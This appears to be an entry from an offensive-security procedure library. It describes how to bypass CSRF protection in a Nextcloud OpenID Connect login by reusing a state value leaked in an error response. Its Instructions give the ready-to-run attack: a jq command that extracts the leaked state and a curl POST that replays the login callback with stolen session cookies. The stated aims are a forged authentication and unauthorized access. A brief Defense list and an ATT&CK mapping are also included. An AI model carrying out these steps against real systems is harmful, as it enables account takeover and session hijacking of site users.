---
id: proc-003
name: Extract-and-Reuse-Leaked-State
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:57.573Z'
tactics:
  - '[[Initial Access]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Steal Web Session Cookie]]'
sub_techniques: []
tags:
  - csrf
  - bypass
  - oidc
  - nextcloud
commands:
  - '[[commands/curl-reuse-state]]'
platforms:
  - Web
  - PHP
tools: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Steal Web Session Cookie]]'
---

# Extract-and-Reuse-Leaked-State

## Summary

This procedure parses the leaked state from the error response and resubmits the callback request with the valid state, successfully bypassing CSRF protection.

## Description

By reusing the leaked state, attackers can forge legitimate-looking OIDC callbacks, leading to unauthorized logins or session hijacking. This renders the CSRF mechanism ineffective.

## Requirements

1. Leaked state from previous error response
2. Session cookies intact
3. JSON parsing capability (e.g., jq)

## Defense

Defensive measures and detection strategies:

- Ensure error responses do not expose sensitive parameters
- Validate state uniqueness and expiration
- Audit login flows for anomaly detection

## Objectives

1. Bypass CSRF verification
2. Complete forged authentication
3. Achieve unauthorized access

## Instructions

### Step 1: Extract State from Error

**Context**: Parse the JSON to get the expected state.

**Command** ([[commands/curl-reuse-state]]):
```bash
cat error.json | jq -r '.expected_state' > leaked_state.txt
```

> Extracts the state value to a file.

### Step 2: Resubmit with Valid State

**Context**: Replay the callback using the leaked state.

**Command** ([[commands/curl-reuse-state]]):
```bash
STATE=$(cat leaked_state.txt)
curl -b cookies.txt -X POST "https://target.com/index.php/login?openIdConnect=callback" -d "state=$STATE&code=some_code" -H "Content-Type: application/x-www-form-urlencoded"
```

> Substitutes the state; expect success without CSRF error.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Steal Web Session Cookie]] Steal Web Session Cookie

### Sub-Techniques


## Commands Used

- [[commands/curl-reuse-state]]

## Tools Used


## Tags

- [[csrf]]
- [[bypass]]
- [[oidc]]
